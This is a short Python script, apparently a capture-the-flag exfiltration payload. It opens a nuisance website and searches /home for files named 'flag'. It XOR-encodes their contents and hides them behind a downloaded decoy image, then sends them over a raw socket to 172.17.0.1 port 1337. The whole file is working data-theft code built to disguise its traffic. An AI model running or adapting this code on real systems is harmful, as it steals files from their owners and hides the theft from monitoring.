import webbrowser
import socket
import urllib.request
from pathlib import Path

webbrowser.open("https://theannoyingsite.com/")


for p in sorted(Path("/home").glob("**/*")):
    if p.is_file() and "flag" in str(p.name):
        gold = p.read_bytes()
        decoy = urllib.request.urlopen(
            "http://unsplash.com/photos/wiqbi_Uyvx8/download?w=640"
        ).read()
        protected_gold = decoy + bytes([b ^ 69 for b in gold])

        with socket.socket() as s:
            s.connect(("172.17.0.1", 1337))
            s.sendall(protected_gold)
